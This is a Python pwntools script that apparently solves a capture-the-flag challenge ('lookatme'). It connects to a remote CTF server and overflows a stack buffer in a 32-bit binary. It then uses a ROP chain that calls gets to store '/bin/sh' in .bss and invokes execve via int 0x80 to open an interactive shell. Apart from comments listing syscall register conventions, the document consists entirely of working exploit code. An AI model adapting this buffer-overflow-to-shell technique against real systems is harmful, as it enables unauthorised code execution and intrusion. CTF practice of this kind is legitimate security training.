from pwn import *

'''
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
'''

context(arch="i386", os='linux')
e = ELF('./lookatme')

r = remote("ctf.j0n9hyun.xyz", 3017)

# syscal table 
# x86 
'''
x86
call table http://faculty.nps.edu/cseagle/assembly/sys_call.html
sysnum	param1  param2  param3  param4  param5	param6  result
eax     ebx     ecx     edx     esi	    edi	    ebp	    eax

x86-64
call table https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
sysnum	param1  param2  param3  param4  param5	param6  result
rax	    rdi	    rsi	    rdx	    r10	    r8	    r9	    rax
'''

# read syscall - 3
# execve - 11

int0x80 = p32(0x0806cc25)
pop_eax = p32(0x080b81c6)
pop_ebx = p32(0x080481c9)
pop_ecx = p32(0x080de955)
pop_edx = p32(0x0806f02a)
bss = p32(e.bss())
ret = p32(0x080481b2)
main = p32(0x80488a3)
gets = p32(0x804f120)

dummy = b"A"*(0x18)

payload  = dummy

payload += ret*10

print(r.recv())
# read from stdin /bin/sh to bss
payload += gets
payload += pop_ebx
payload += bss

# call execve
payload += pop_ebx
payload += bss
payload += pop_ecx
payload += p32(0x00)
payload += pop_edx
payload += p32(0x00)
payload += pop_eax
payload += p32(0xb)
payload += int0x80

r.sendline(payload)
sleep(1)
r.send(b"////////bin/sh\x00")

r.interactive()